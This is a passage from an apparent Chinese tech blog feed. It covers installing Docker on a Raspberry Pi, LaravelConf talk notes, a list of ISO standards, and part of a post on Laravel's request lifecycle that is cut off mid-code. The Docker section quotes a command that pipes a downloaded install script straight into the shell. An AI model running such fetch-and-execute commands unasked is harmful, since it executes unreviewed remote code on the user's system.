        <content type="html"><![CDATA[<p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4d44ll1ydj31a90ijjuz.jpg" alt=""></p><p>Write Once, Run Everywhere.</p><a id="more"></a><p>今天树莓派刚刚发布了<a href="https://www.raspberrypi.org/blog/raspberry-pi-4-on-sale-now-from-35/" target="_blank" rel="noopener">树莓派 4</a>，以下是本次升级的主要变化：</p><ul><li>A 1.5GHz quad-core 64-bit ARM Cortex-A72 CPU (~3× performance)</li><li>1GB, 2GB, or 4GB of LPDDR4 SDRAM</li><li>Full-throughput Gigabit Ethernet</li><li>Dual-band 802.11ac wireless networking</li><li>Bluetooth 5.0</li><li>Two USB 3.0 and two USB 2.0 ports</li><li>Dual monitor support, at resolutions up to 4K</li><li>VideoCore VI graphics, supporting OpenGL ES 3.x</li><li>4Kp60 hardware decode of HEVC video</li><li>Complete compatibility with earlier Raspberry Pi products</li></ul><p>虽然真香，但想起我还在吃灰的 3B，于是打算先把 3B 用起来。那我们就从头开始吧。</p><p>树莓派是基于ARM架构的，和与PC不同。所以一些树莓派上的镜像无法在PC上运行，反之亦然。如果需要找树莓派专用的镜像，在 Dockerhub 上搜索 ARM 或 Rpi 等相关关键词即可。</p><p>我们讲解两种 docker 安装方式：</p><h1 id="方式一：手动安装"><a href="#方式一：手动安装" class="headerlink" title="方式一：手动安装"></a>方式一：手动安装</h1><h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><blockquote><p>macOS 10.14.5<br>Raspberry 3B<br>Pi OS Version: Raspbian Buster Lite<br>balenaEtcher Version: 1.5.50</p></blockquote><h2 id="Step-1-下载系统"><a href="#Step-1-下载系统" class="headerlink" title="Step 1 下载系统"></a>Step 1 下载系统</h2><p>前往树莓派官网<a href="https://www.raspberrypi.org/downloads/" target="_blank" rel="noopener">下载</a>所需系统，由于手头只有一张 16G 的内存卡，同时为了将系统资源用在执行任务而非桌面上，因此我选择的是 Raspbian Buster Lite。</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4d3gmin6rj30rk0fmac7.jpg" alt=""></p><p>系统下载完成后，解压 zip 包，我们会得到一个后缀为 .img 的镜像包。</p><h2 id="Step-2-烧录系统"><a href="#Step-2-烧录系统" class="headerlink" title="Step 2 烧录系统"></a>Step 2 烧录系统</h2><p>前往 <a href="https://www.balena.io/etcher/" target="_blank" rel="noopener">https://www.balena.io/etcher/</a> 下载烧录工具，该工具支持 Mac、Windows、Linux 系统（终于不用在虚拟机里处理了），接下来，打开 balenaEtcher，插入内存卡，选择上一步的 img 镜像包，点击 Flash 按钮，等待烧录完成</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4d3ihshskj30ma0b9aan.jpg" alt=""></p><blockquote><p>注意：如果直接将解压的镜像包内容拷贝到内存卡中，会出现无法安装的问题。我试了最新的两个 Lite 安装包，一个出现<code>cma_alloc alloc failed</code>的错误，另一个光标一直在屏幕左上角闪烁。最后通过该烧录软件顺利完成。<br>参考资料 <a href="https://www.youtube.com/watch?v=y5SOuBOy2ZQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=y5SOuBOy2ZQ</a></p></blockquote><h2 id="Step-3-安装系统"><a href="#Step-3-安装系统" class="headerlink" title="Step 3 安装系统"></a>Step 3 安装系统</h2><p>当烧录完成后，将内存卡弹出，然后插入树莓派，并连接 HDMI 接口的显示器与键盘。当以上工作都完成后，对树莓派进行供电，此时，系统会自动执行安装操作</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4d3lmipe3j30ma0jq0w5.jpg" alt=""></p><p>当最后出现 login 时，表示系统已经安装完成。树莓派的默认用户名为 pi，密码为 raspberry。root 用户需要通过命令 <code>sudo passwd root</code> 激活并设置密码。</p><h2 id="Step-4-系统设置"><a href="#Step-4-系统设置" class="headerlink" title="Step 4 系统设置"></a>Step 4 系统设置</h2><p>输入命令<code>sudo raspi-config</code>进入系统配置页。</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4d3qh6emrj314m0loq6p.jpg" alt=""></p><p>此处可设置 WiFi 网络、ssh、时区等相关信息。</p><h2 id="Step-5-安装-Docker"><a href="#Step-5-安装-Docker" class="headerlink" title="Step 5 安装 Docker"></a>Step 5 安装 Docker</h2><p>根据 Docker <a href="https://docs.docker.com/install/linux/docker-ce/debian/" target="_blank" rel="noopener">官方文档</a>，在树莓派中安装 docker，支持以下3种方式：</p><ol><li>通过设置 Docker 仓库安装，该方式为 debian 的推荐安装方式，但<strong>不支持树莓派</strong>。</li><li>通过下载 deb 包手动安装与升级，适用于无网络状态。</li><li>通过<a href="https://docs.docker.com/install/linux/docker-ce/debian/#install-using-the-convenience-script" target="_blank" rel="noopener">官方脚本</a>安装，适用于测试与开发环境，<strong>切勿用于生产环境</strong>，且该方式<strong>仅支持树莓派</strong>安装。</li></ol><p>海外用户可通过以下两个教程安装：</p><ol><li><a href="https://pcmac.biz/Docker_Raspberrypi.html" target="_blank" rel="noopener">https://pcmac.biz/Docker_Raspberrypi.html</a></li><li><a href="https://blog.docker.com/2019/03/happy-pi-day-docker-raspberry-pi/" target="_blank" rel="noopener">https://blog.docker.com/2019/03/happy-pi-day-docker-raspberry-pi/</a></li></ol><p>大陆用户可通过以下教程安装：</p><ul><li><a href="https://yeasy.gitbooks.io/docker_practice/install/raspberry-pi.html" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/install/raspberry-pi.html</a><br>大陆由于网络原因，需要将树莓派的仓库镜像源更换为<a href="https://mirror.tuna.tsinghua.edu.cn/help/raspbian/" target="_blank" rel="noopener">国内镜像源</a><br>在执行<code>get-docker.sh</code>时，也需要指定为阿里云<code>$ sudo sh get-docker.sh --mirror Aliyun</code>加速。</li></ul><blockquote><p>需要注意的是，当前树莓派刚更新为 debian 最新版本 buster，但 docker 尚未支持 buster，因此当执行<code>curl -sSL https://get.docker.com | sh</code>时会遇到错误 <code>E: The repository &#39;https://download.docker.com/linux/raspbian 10 Release&#39; does not have a Release file.</code>。</p><p>通过输出可知，脚本获取了当前的最新版本，并写入了文件<code>/etc/apt/sources.list.d/docker.list</code>，但现在尚不支持最新版本，因此可以我们需要修改<code>get-docker.sh</code>指定脚本为可支持的版本: </p><p><code>$sh_c &quot;echo \&quot;$apt_repo\&quot; &gt; /etc/apt/sources.list.d/docker.list&quot;</code><br>为<br><code>$sh_c &quot;echo \&quot;deb [arch=armhf] https://mirrors.aliyun.com/docker-ce/linux/raspbian stretch stable\&quot; &gt; /etc/apt/sources.list.d/docker.list&quot;</code>，<br>然后验证<code>/etc/apt/sources.list.d/docker.list</code>的内容是否与脚本一致，一致就可以执行脚本并安装了。</p></blockquote><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4d8wb2n9xj30u00vtdop.jpg" alt=""></p><p>经过一上午的折腾，终于成功安装了 docker！</p><h2 id="Step-6-安装-Docker-Compose"><a href="#Step-6-安装-Docker-Compose" class="headerlink" title="Step 6 安装 Docker Compose"></a>Step 6 安装 Docker Compose</h2><p>安装完 docker 后，我们还需要安装 docker compose。我们可以通过<code>sudo apt install python-pip</code>来安装 Python 的包管理工具，安装成功后，执行命令<code>pip install docker-compose</code>安装 docker compose，安装过程时间较长（可使用<code>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple docker-compose</code>来临时使用清华 pypi 镜像源），也可能因网络原因出现多次中断的情况，请耐心等待。</p><blockquote><p>注意：<code>sudo apt install python3-pip</code> 安装 pip3 会有很多的问题，因此我们通过安装 pip2 来解决。</p></blockquote><h2 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h2><p>使用 HypriotOS 而非树莓派官方系统。<a href="https://blog.hypriot.com/faq/" target="_blank" rel="noopener">这里</a>介绍了什么是 HypriotOS。</p><p>虽然使用该方式可以快速安装 docker 及 docker-compose，但存在一个致命的问题——WiFi 无法使用，查询了大量的资料后，都是说修改 <code>user-data</code> 文件的以下内容，但我发现在未启用这段代码前，使用默认的用户名和密码可以正常登陆，但启用后，即使你没有修改默认的用户名和密码，仍然无法登陆。原因未知，在经过一番折腾后，我决定弃坑了。</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4du26o13wj30g609v75c.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> raspberry pi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LaravelConf Taiwan</title>
      <link href="/post/laraconf-taiwan/"/>
      <url>/post/laraconf-taiwan/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4d4cfzp7cj310c0e9wh8.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from &#123;&#123;$idea&#125;&#125; to &#123;&#123;$production&#125;&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="LaravelConf-2018"><a href="#LaravelConf-2018" class="headerlink" title="LaravelConf 2018"></a>LaravelConf 2018</h1><h2 id="1-站点国际化"><a href="#1-站点国际化" class="headerlink" title="1 站点国际化"></a>1 <a href="https://www.youtube.com/watch?v=IOrOCBkrADw&list=PLVBnNBXRHG-jCJ8e2vfiCJCS2ipfX9-Rf&index=3" target="_blank" rel="noopener">站点国际化</a></h2><p>我们可通过用户的 Session、IP、设定偏好等方式来确定用户的位置，并呈现出本地化信息，如语言、时间、币种等。<br>geoip2/geoip2 可以通过 IP 获取到相关的地区、时区、语言等信息</p><h3 id="1-1-语言"><a href="#1-1-语言" class="headerlink" title="1.1 语言"></a>1.1 语言</h3><p>在 Laravel 5.x 中，可设定<code>/config/app.php</code>中的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$local = App::getLocale();</span><br><span class="line">App::setLocale($locale);</span><br></pre></td></tr></table></figure><p>Locale 的名称需要与 lang 目录的名称相同<br><code>en =&gt; /resources/lang/en</code></p><p>可以一种语言对应一个 view 目录，也可以多种语言对应一个 view(如 en-us 与 en-uk 对应 en)</p><p>php可以使用<code>mcamara/laravel-localization</code>来处理本地化问题：</p><ol><li>如果语言在网址中没有携带，则可以依据此包中的设定，决定使用<code>app.php</code>中的默认语言，还是浏览器请求头中的<code>Accept-Language</code></li><li>将没有请求语言的网址自动 301 到设定的默认语言</li></ol><h3 id="1-2-网址"><a href="#1-2-网址" class="headerlink" title="1.2 网址"></a>1.2 网址</h3><h4 id="1-2-1-以国家做区分"><a href="#1-2-1-以国家做区分" class="headerlink" title="1.2.1 以国家做区分"></a>1.2.1 以国家做区分</h4><p><a href="http://example.com/cn" target="_blank" rel="noopener">http://example.com/cn</a><br>相关ISO标准：ISO-3166-1<br>示例：Apple、Google</p><h4 id="1-2-2-以语言做区分"><a href="#1-2-2-以语言做区分" class="headerlink" title="1.2.2 以语言做区分"></a>1.2.2 以语言做区分</h4><p><a href="http://example.com/zh" target="_blank" rel="noopener">http://example.com/zh</a><br>相关ISO标准：ISO-639-1<br>示例：LINE</p><h3 id="1-3-时间"><a href="#1-3-时间" class="headerlink" title="1.3 时间"></a>1.3 时间</h3><p>大多跨境网站的时区设定为 UTC<br>时区设定为 UTC，存储时间信息时可以通过以下两种方式</p><ol><li>前端请求的时间转换为 UTC 后发送给后端</li><li>前端请求中携带时区信息，由后端转换为 UTC</li></ol><blockquote><p>注意夏令时对同一时区的时间影响。</p></blockquote><p>php中可以使用<code>nesbot/carbon</code>来处理时间问题</p><h3 id="1-4-币种"><a href="#1-4-币种" class="headerlink" title="1.4 币种"></a>1.4 币种</h3><p>问题一：该平台允许交易的币种有哪些？<br>问题二：如果支持多种币种，是否可以设定基础币种<br>问题三：使用固定汇率还是浮动汇率？</p><p>可使用<code>moneyphp/money</code>、<code>webpatser/laravel-countries</code>与<code>torann/currency</code></p><h3 id="1-5-数据格式"><a href="#1-5-数据格式" class="headerlink" title="1.5 数据格式"></a>1.5 数据格式</h3><p>手机号、地址<br><code>giggsey/libphonenumber-for-php</code>可处理手机号信息、如格式化、获取国家、运营商等<br><code>commerceguys/addressing</code> 可用于处理地址信息</p><h2 id="2-小项目的制作与推广"><a href="#2-小项目的制作与推广" class="headerlink" title="2 小项目的制作与推广"></a>2 <a href="https://www.youtube.com/watch?v=OqwwOpVuImY&list=PLVBnNBXRHG-jCJ8e2vfiCJCS2ipfX9-Rf&index=6" target="_blank" rel="noopener">小项目的制作与推广</a></h2><ol><li>很多功能可能并不确定是否会有好的反响，此时应该先快速做一个基础功能推出，根据用户使用情况再决定方向。</li><li>网站可通过捐赠或者出售，或者为客户定制化来盈利（定制化可将基础功能开源，然后对搭建与维护系统进行收费）</li><li>Laravel module 与 Git tree 可以管理多个相似定制化的项目</li></ol><h2 id="3-工程师的职业规划"><a href="#3-工程师的职业规划" class="headerlink" title="3 工程师的职业规划"></a>3 工程师的职业规划</h2><h3 id="3-1-Junior（毕业5年内）"><a href="#3-1-Junior（毕业5年内）" class="headerlink" title="3.1 Junior（毕业5年内）"></a>3.1 Junior（毕业5年内）</h3><ul><li>寻找方向，融入行业（加入大型稳定公司，学习高效行事能力、行业规范及职业价值观）</li></ul><h3 id="3-2-Senior（毕业5-10年）"><a href="#3-2-Senior（毕业5-10年）" class="headerlink" title="3.2 Senior（毕业5~10年）"></a>3.2 Senior（毕业5~10年）</h3><ul><li><strong>挑好的产品、好的团队文化加入</strong>（加入有潜力、正在快速成长的公司，积累很多经验。最好是面向普通用户型产品的精英团队。<em>在下份工作时，要找自己感兴趣的 C 端产品，询问公司的加班文化及自由度，比如：我们通常的上下班时间？贵公司对经常加班怎么看？是否会允许远程工作？是否会有经常会有凌晨上线？</em>）</li></ul><h3 id="3-3-接案者"><a href="#3-3-接案者" class="headerlink" title="3.3 接案者"></a>3.3 接案者</h3><ul><li>自由，但极需自律与严谨</li></ul><p>无法转换为产品的技术没有价值。<br>一个优秀的工程师不会只会一种语言，不会只能写业务代码。</p><h3 id="3-4-职业生涯怎么走"><a href="#3-4-职业生涯怎么走" class="headerlink" title="3.4 职业生涯怎么走"></a>3.4 <a href="https://www.youtube.com/watch?v=jEe1zOCtPCk&list=PLVBnNBXRHG-jCJ8e2vfiCJCS2ipfX9-Rf&index=7" target="_blank" rel="noopener">职业生涯怎么走</a></h3><p>钱？前途？自己喜欢的事？</p><p>钱很重要，但什么时候变现更重要</p><p>在职业后期，更需要将技术转换为产品，一个了解技术和用户的产品会有绝对优势。<br>在开发一些不认同的功能时，可以询问产品与运营，看看他们的思维角度与方式。</p><p>架构师与了解产品的技术是市面很缺乏的人才。</p><p>简历可以写的更富有创意，比如 json 格式，面试语言代码等。至少在简历筛选关能获得较高的通过率</p><h2 id="4-Laravel-與-Swoole-的整合之路"><a href="#4-Laravel-與-Swoole-的整合之路" class="headerlink" title="4 Laravel 與 Swoole 的整合之路"></a>4 <a href="https://www.youtube.com/watch?v=wTrUOWuJBl0&list=PLVBnNBXRHG-jCJ8e2vfiCJCS2ipfX9-Rf&index=12" target="_blank" rel="noopener">Laravel 與 Swoole 的整合之路</a></h2><p>首先，我们来看下一个 PHP 请求的生命周期</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4l6gcvhs2j30si0g1myj.jpg" alt="PHP&#39;s Lifecycle"></p><p>如图所示，在一个 PHP 请求中，需要加载相关的依赖文件，并进行语法验证与解析、编译等过程，而我们都知道，I/O 是最大的性能瓶颈，这就是为什么php性能较低的原因了。</p><p>接下来，我们通过<code>get_included_requires()</code>看下 Laravel 的一个请求需要载入多少文件。经实验得知，纯净 Laravel 加载文件数量在 218 个，如果加载了其他 vendor，数量会更多。</p><p>加载了这么多的文件，那 Laravel 的生命周期是怎样的呢？</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4hvdq3v5kj31840outc8.jpg" alt="Laravel&#39;s Lifecycle"></p><p>现在，我们找到了拖慢 Laravel 的原因：</p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g4l6l1095hj30sj0g176h.jpg" alt="What Makes Laravel Slow?"></p><p>我既想要 Laravel 的优雅，又想要高性能，该怎么做呢？还好，已经有前人做了 swoole 这样的工具，为 php 插上翅膀，我们要做的工作就是把 Laravel 和 swoole 结合起来。我们先来了解下 Swoole 的模型：</p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g4hvzuxa0sj31840osjuw.jpg" alt="Swoole&#39;s Model"></p><blockquote><p>在 Linux 中，使用 Epoll 方式处理异步，在 BSD 中，则使用 Kqueue。</p></blockquote><p>了解了 swoole 后，我们自然会想到如下的几种集成方案：</p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g4hw1t0pgyj31820osjux.jpg" alt="集成方案"></p><p>但是，我们在集成中会遇到以下的问题：</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4hwefdz7ij317y0osgos.jpg" alt="集成所存在的问题"></p><p>我们先来了解下 Laravel 的容器服务机制：</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4hwfh8dkcj31820omq6a.jpg" alt="Laravel&#39;s Service Container"></p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4hwgvwzdej31860ouq72.jpg" alt="Laravel&#39;s Facades"></p><p>如果我们将那些重复的工作只在第一次启动 Laravel 完成，在之后的请求不就可以直接跳过那些不必要的流程了吗？但这样会带来一个问题：如果上次请求的结果未能及时清除，可能会污染到后续的请求(尤其是那些静态变量、全局变量等），那我们将每次请求隔离在沙箱中不就解决了吗？</p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g4hwi82qgcj31820outc9.jpg" alt="Sandbox App Container"></p><p>但并非所有的实例都需要在每次请求时加载，完全可以读取共享文件，如 db, session, config, cache …</p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g4hwjigmdgj31ha0u0tdt.jpg" alt="Instances Outside of Sanbox"></p><p>在沙箱模型中，我们的请求流程就变成了这样：</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4hwkk3ddfj31hg0u00xf.jpg" alt="Sandbox App Container"></p><p>到目前为止，似乎我们的已经完成了所有的工作，但 Laravel 中复杂的容器机制让我们还有新的挑战需要去克服：</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4la15xjd3j31840ow776.jpg" alt="Redirection of App Container"></p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g4la9l8l0nj30th0fgwgk.jpg" alt=""></p><p>现在，Laravel 的生命周期就变为了这样：<br><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g4la84ngz8j317y0ouq6w.jpg" alt="Laravel&#39;s New Lifecycle"></p><p>接下来，让我们看下 Laravel Swoole 的优势有哪些：</p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g4lacgomaxj31800owae5.jpg" alt="Laravel Swoole Advantage"></p><p>以前，我们在 Laravel 中这样使用 Websocket<br><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g4lafnkbg0j31800osacv.jpg" alt="Websocket in Laravel"></p><p>现在，我们在 Laravel 中这样使用 Websocket<br><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4lahh5grwj31840naq5n.jpg" alt="Websocket in Laravel Swoole"></p><p>在 Swoole 4.0+ 中，异步方式被协程所取代，我们可以通过协程来加速应用</p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g4lakuc4nbj31860nctc8.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4lamrocopj31800newhr.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4lano5e27j317y0natb6.jpg" alt="MySQL Coroutine"></p><blockquote><p>关于 Laravel 集成 Swoole 的相关文章：<br>Part 1 <a href="https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-1/" target="_blank" rel="noopener">https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-1/</a><br>Part 2 <a href="https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-2/" target="_blank" rel="noopener">https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-2/</a><br>Part 3 <a href="https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-3/" target="_blank" rel="noopener">https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-3/</a><br>Part 4 <a href="https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-4/" target="_blank" rel="noopener">https://blog.albert-chen.com/the-integration-of-laravel-with-swoole-part-4/</a></p></blockquote><blockquote><p>Swoft 框架中相关信息说明<br><a href="https://www.swoft.org/docs/2.x/zh-CN/ready/tradition.html" target="_blank" rel="noopener">Nginx + php-fpm 模式</a><br><a href="https://www.swoft.org/docs/2.x/zh-CN/ready/io.html" target="_blank" rel="noopener">Linux 中 I/O 多路复用的说明</a><br><a href="https://www.swoft.org/docs/2.x/zh-CN/ready/swoole.html" target="_blank" rel="noopener">Swoole 中的协程</a></p></blockquote><blockquote><p>关于协程的概念讲解：<a href="https://www.itcodemonkey.com/article/4620.html" target="_blank" rel="noopener">漫画：什么是协程？</a></p><p>协程，英文Coroutines，是一种比线程更加轻量级的存在。正如一个进程可以拥有多个线程一样，<strong>一个线程也可以拥有多个协程</strong>。最重要的是，<strong>协程不是被操作系统内核所管理，而完全是由程序所控制</strong>（也就是在用户态执行）。</p></blockquote><blockquote><p>扩展阅读<br><a href="https://zhuanlan.zhihu.com/p/62766037" target="_blank" rel="noopener">什么是CPU密集型、IO密集型？</a><br><a href="https://www.zhihu.com/question/19903344/answer/96081382" target="_blank" rel="noopener">CPU 和 GPU 的区别是什么？</a><br>总的来说，由于动态解释型语言的执行效率不高，但开发效率较高，CPU大部分时间都在等待 I/O，因此适合做 I/O 密集型业务，而不适合做 CPU 密集型业务。相反，静态语言的执行效率高，因此适合做 CPU 密集型，如 C 语言。 GPU 相比 CPU 而言，运算能力更强，但逻辑处理能力较低，因此 GPU 适合做简单的密集型计算，比如图形渲染，密码暴力破解等。</p></blockquote><h2 id="5-打造自己的粉专客服机器人"><a href="#5-打造自己的粉专客服机器人" class="headerlink" title="5 打造自己的粉专客服机器人"></a>5 打造自己的粉专客服机器人</h2><p>PHP版本的机器学习库<a href="https://github.com/php-ai/php-ml" target="_blank" rel="noopener">php-ml</a><br>一个较为成熟的机器人接口<a href="http://www.turingapi.com" target="_blank" rel="noopener">图灵机器人</a></p><h2 id="6-快速打造定制化管理后台"><a href="#6-快速打造定制化管理后台" class="headerlink" title="6 快速打造定制化管理后台"></a>6 快速打造定制化管理后台</h2><p>使用 <a href="https://laravelvoyager.com/" target="_blank" rel="noopener">Voyager</a> 可以快速搭建管理后台，该工具实现了</p><ol><li>媒体管理</li><li>菜单管理</li><li>数据库管理</li><li>站点设置</li><li>…</li></ol><h2 id="7-网站信息安全"><a href="#7-网站信息安全" class="headerlink" title="7 网站信息安全"></a>7 网站信息安全</h2><ol><li>不要相信任何外部信息来源</li><li>管理平台不要泄露在任何一个前端节点</li><li>不要让用户上传的文件成为可执行文件</li><li>务必遵循最小权限原则</li><li>写代码的时间远小于被黑客攻击的损失</li></ol><h2 id="8-如何正确部署-Laravel"><a href="#8-如何正确部署-Laravel" class="headerlink" title="8 如何正确部署 Laravel"></a>8 如何正确部署 Laravel</h2><ul><li>php &gt;= 7.1</li><li>Extension<ul><li>OpenSSL</li><li>PDO</li><li>mbstring</li><li>Tokenizer</li><li>XML</li><li>Ctype</li><li>JSON</li><li>opcache</li><li>gd</li><li>bcmath</li><li>pcntl</li><li>zip</li></ul></li></ul><p>使用 Crontab 时，尽量<strong>避免</strong>使用时区的功能，<strong>最好</strong>设定 cache 使用。<br><a href="https://github.com/phpredis/phpredis" target="_blank" rel="noopener">phpredis</a> 性能更好，<a href="https://github.com/nrk/predis" target="_blank" rel="noopener">predis</a> 开发更便捷。</p><h2 id="9-代码质量"><a href="#9-代码质量" class="headerlink" title="9 代码质量"></a>9 代码质量</h2><p>代码风格工具：<a href="https://github.com/FriendsOfPHP/PHP-CS-Fixer" target="_blank" rel="noopener">PHP-CS-Fixer</a>, <a href="https://github.com/squizlabs/PHP_CodeSniffer" target="_blank" rel="noopener">PHP_CodeSniffer</a><br>php 静态分析：<a href="https://github.com/phpstan/phpstan" target="_blank" rel="noopener">phpstan</a>, <a href="https://github.com/vimeo/psalm" target="_blank" rel="noopener">psalm</a><br>CI 工具：<a href="https://travis-ci.org/" target="_blank" rel="noopener">Travis CI</a>, <a href="https://styleci.io/" target="_blank" rel="noopener">StyleCI</a></p><h1 id="LaravelConf-2017"><a href="#LaravelConf-2017" class="headerlink" title="LaravelConf 2017"></a>LaravelConf 2017</h1><hr><p><em>未完待续……</em></p>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用 ISO 标准列表</title>
      <link href="/post/iso-list/"/>
      <url>/post/iso-list/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8cm36p6cnj30m80b475l.jpg" alt=""></p><p>这是一个熵增的世界，唯有秩序方能重建世界。</p><a id="more"></a><p>著名的国际化标准组织已经制定了一些列的标准，常用的标准如下：</p><ul><li><a href="https://zh.wikipedia.org/wiki/ISO_639" target="_blank" rel="noopener">ISO-639</a> 语言名称</li><li><a href="https://zh.wikipedia.org/wiki/ISO_690" target="_blank" rel="noopener">ISO-690</a> 学术论著参考书目格式</li><li><a href="https://zh.wikipedia.org/wiki/ISO_1000" target="_blank" rel="noopener">ISO-1000</a> 国际单位制</li><li><a href="https://zh.wikipedia.org/wiki/ISO_3166" target="_blank" rel="noopener">ISO-3166</a> 国家名称代码</li><li><a href="https://zh.wikipedia.org/wiki/ISO_4217" target="_blank" rel="noopener">ISO-4217</a> 货币及基金代码</li><li><a href="https://zh.wikipedia.org/wiki/ISO_5218" target="_blank" rel="noopener">ISO-5218</a> 人类性别表示</li><li><a href="https://zh.wikipedia.org/wiki/ISO_6709" target="_blank" rel="noopener">ISO-6709</a> 地理点位置的纬度、经度和海拔高度</li><li><a href="https://zh.wikipedia.org/wiki/ISO_8601" target="_blank" rel="noopener">ISO-8601</a> 日期和时间的表示方法</li><li><a href="https://zh.wikipedia.org/wiki/ISO_9000" target="_blank" rel="noopener">ISO-9000</a> 品质管理系统</li></ul><hr><p>参考资料：<br><a href="https://zh.wikipedia.org/wiki/%E5%9C%8B%E9%9A%9B%E6%A8%99%E6%BA%96%E5%8C%96%E7%B5%84%E7%B9%94" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E5%9C%8B%E9%9A%9B%E6%A8%99%E6%BA%96%E5%8C%96%E7%B5%84%E7%B9%94</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ISO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel 生命周期</title>
      <link href="/post/laravel-life-cycle/"/>
      <url>/post/laravel-life-cycle/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4hvdq3v5kj31840outc8.jpg" alt=""></p><a id="more"></a><h2 id="1-引入依赖"><a href="#1-引入依赖" class="headerlink" title="1. 引入依赖"></a>1. 引入依赖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/../vendor/autoload.php'</span>;</span><br></pre></td></tr></table></figure><h3 id="2-创建-Laravel-应用实例"><a href="#2-创建-Laravel-应用实例" class="headerlink" title="2. 创建 Laravel 应用实例"></a>2. 创建 Laravel 应用实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$app = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">'/../bootstrap/app.php'</span>;</span><br></pre></td></tr></table></figure><h4 id="2-1-创建-Laravel-实例"><a href="#2-1-创建-Laravel-实例" class="headerlink" title="2.1 创建 Laravel 实例"></a>2.1 创建 Laravel 实例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$app = <span class="keyword">new</span> Illuminate\Foundation\Application(</span><br><span class="line">    $_ENV[<span class="string">'APP_BASE_PATH'</span>] ?? dirname(<span class="keyword">__DIR__</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h5 id="2-1-1-设定项目路径信息"><a href="#2-1-1-设定项目路径信息" class="headerlink" title="2.1.1 设定项目路径信息"></a>2.1.1 设定项目路径信息</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">bindPathsInContainer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path'</span>, <span class="keyword">$this</span>-&gt;path());                     <span class="comment">//app_path()        app 目录的绝对路径</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.base'</span>, <span class="keyword">$this</span>-&gt;basePath());            <span class="comment">//base_path()       